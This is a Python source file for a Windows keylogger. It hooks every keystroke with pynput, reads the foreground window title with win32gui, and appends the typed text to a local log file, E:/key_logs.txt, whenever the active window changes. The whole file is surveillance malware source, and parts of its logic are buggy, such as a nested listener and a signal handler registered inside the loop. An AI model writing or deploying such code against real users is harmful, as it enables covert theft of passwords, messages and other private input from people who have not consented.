import win32gui
import time
import os
from pynput.keyboard import Listener
from pynput.keyboard import Key
import signal

current_time = 0.0
current_app = ""
window_title = ""

def get_app_name():
    """
    Get the name of the active window.
    """
    hwnd = win32gui.GetForegroundWindow()
    app = win32gui.GetWindowText(hwnd)
    return app

def write_to_file(output_text):
    file_name = f"E:/key_logs.txt"
    with open(file_name, "a") as f:
        f.write(output_text)

def on_activate(event):
    global window_title
    window_title = event.WindowName


def on_press(key):
    """
    The function that's called when a key is pressed.
    """
    global output_text
    try:
        output = str(key.char)
    except AttributeError:
        if key == Key.space:
            output = " "
        elif key == Key.enter:
            output = "<ENTER>"
        elif key == Key.backspace:
            output = "<BSPC>"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            output = "<CTRL>"
        elif key == Key.shift_l or key == Key.shift_r:
            output = "<SHIFT>"
        elif key == Key.alt_l or key == Key.alt_gr:
            output = "<ALT>"
        else:
            output = str(key)
    output_text += output

def on_release(key):
    """
    The function that's called when a key is released.
    """
    global output_text
    if key == Key.esc:
        write_to_file(output_text)
        return False
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        # Check if the next key pressed is A-Z
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        listener.join(0.1)
        if not listener.is_alive() and output_text[-1].isalpha():
            output_text = output_text[:-1]  # Remove the control character if it was just a modifier
        else:
            output_text += "<CTRL>"  # Control character was not followed by another key
        listener.stop()

# Initialize the output text.
output_text = ""

# Start the listener.
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Loop indefinitely, constantly checking for the active window and updating the output file as needed.
    while True:
        # Get the name of the active window.
        app = get_app_name()
        if app != current_app:
            # If the active window has changed, write the output text to a file and reset the output text.
            if current_app:
                write_to_file(output_text)
            current_app = app
            output_text = ""

        # Wait for a short time before checking the active window again.
        time.sleep(0.1)

        # Catch the KeyboardInterrupt exception and gracefully exit when the user presses Ctrl+C.
        def signal_handler(signal, frame):
            write_to_file(output_text)
            print("Exiting program...")
            os._exit(0)
        signal.signal(signal.SIGINT, signal_handler)
